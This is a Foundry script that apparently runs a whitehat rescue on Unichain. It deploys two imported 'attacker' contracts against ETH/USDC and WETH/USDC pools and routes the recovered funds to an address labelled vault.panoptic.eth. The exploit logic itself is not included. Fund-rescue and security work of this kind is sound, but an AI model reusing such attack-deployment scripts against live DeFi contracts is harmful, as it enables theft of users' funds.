// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "forge-std/Script.sol";
import {ETH_USDC5bpsUnichainAttacker_Deployer, ETH_USDC5bpsUnichainAttacker} from "./attacker-contracts/Deployable_ETH_USDC_5bpsUnichain.sol";
import {WETH_USDC5bpsUnichainAttacker_Deployer, WETH_USDC5bpsUnichainAttacker} from "./attacker-contracts/Deployable_WETH_USDC_5bpsUnichain.sol";

contract ExecuteUnichainWhitehat is Script {
    function run() public {
        uint256 DEPLOYER_PRIVATE_KEY = vm.envUint("DEPLOYER_PRIVATE_KEY");

        vm.startBroadcast(DEPLOYER_PRIVATE_KEY);

        // vault.panoptic.eth on unichain
        address withdrawer = 0x82BF455e9ebd6a541EF10b683dE1edCaf05cE7A1;

        console.log("Executing the first attack, on ETH/USDC5bps:");
        ETH_USDC5bpsUnichainAttacker_Deployer ethUsdcAttackerDeployer = new ETH_USDC5bpsUnichainAttacker_Deployer{salt: bytes32(uint256(0x123))}(withdrawer);
        console.log("ETH_USDC5bpsUnichainAttacker_Deployer deployed at:", address(ethUsdcAttackerDeployer));
        console.log("ETH_USDC5bpsUnichainAttacker_Deployer succeeded");
        ETH_USDC5bpsUnichainAttacker ethUsdcAttacker = ethUsdcAttackerDeployer.attacker();
        console.log("ETH_USDC5bpsUnichainAttacker deployed and holding funds at:", address(ethUsdcAttacker));

        console.log("Executing the second attack, on WETH/USDC:");
        WETH_USDC5bpsUnichainAttacker_Deployer wethUsdcAttackerDeployer = new WETH_USDC5bpsUnichainAttacker_Deployer{salt: bytes32(uint256(0x123))}(withdrawer);
        console.log("WETH_USDC5bpsUnichainAttacker_Deployer deployed at:", address(wethUsdcAttackerDeployer));
        console.log("WETH_USDC5bpsUnichainAttacker_Deployer succeeded");
        WETH_USDC5bpsUnichainAttacker wethUsdcAttacker = wethUsdcAttackerDeployer.attacker();
        console.log("WETH_USDC5bpsUnichainAttacker deployed and holding funds at:", address(wethUsdcAttacker));

        vm.stopBroadcast();
    }
}
